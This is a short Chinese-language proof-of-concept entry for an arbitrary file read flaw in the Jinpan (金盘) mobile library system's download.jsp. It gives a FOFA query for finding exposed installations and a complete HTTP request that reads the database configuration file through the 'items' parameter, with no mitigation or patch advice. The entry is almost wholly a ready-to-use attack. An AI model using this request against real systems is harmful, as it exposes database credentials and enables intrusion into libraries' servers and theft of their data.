# 金盘移动图书馆系统download.jsp存在任意文件读取漏洞

金盘移动图书馆系统download.jsp存在任意文件读取漏洞，通过该漏洞读取数据库配置文件等

## fofa

```javascript
app="金盘软件-金盘移动图书馆系统"
```

## poc

```javascript
GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cookie: JSESSIONID=D8C7BD39FAF4DD095FBBB0E87FB017C5
Connection: close
```

![image-20250217101024678](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502171010739.png)